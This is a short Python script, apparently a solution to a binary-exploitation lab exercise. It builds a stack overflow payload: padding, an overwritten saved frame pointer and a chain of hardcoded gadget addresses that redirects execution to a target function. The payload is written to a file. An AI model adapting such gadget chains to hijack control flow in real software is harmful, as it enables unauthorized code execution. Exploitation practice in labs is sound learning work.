import struct

def p64(addr):
    return struct.pack("<Q", addr)

func1_addr = 0x401216
mov_rax_rdi_ret = 0x4012e6 
pop_rbp_ret = 0x4011fd

buffer_start_addr = 0x7fffffffdb10 

payload = p64(0x72)             
payload += b"A" * 24           
payload += b"B" * 8          
payload += p64(pop_rbp_ret)

payload += p64(buffer_start_addr + 8)

payload += p64(mov_rax_rdi_ret) 
payload += p64(func1_addr)      

with open("payload_p3", "wb") as f:
    f.write(payload)

print("Payload 已生成")